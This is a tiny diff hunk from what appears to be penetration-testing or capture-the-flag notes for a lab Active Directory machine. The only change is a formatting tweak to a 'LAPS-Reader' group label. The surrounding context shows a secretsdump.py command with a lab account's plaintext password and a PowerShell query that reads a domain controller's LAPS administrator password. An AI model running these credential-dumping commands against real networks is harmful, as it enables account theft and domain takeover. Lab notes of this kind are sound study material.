@@ -261,6 +261,6 @@ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 ```
 #### User exploit with group
 ```
-LAPS-Reader
+*LAPS-Reader*
 Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 ```
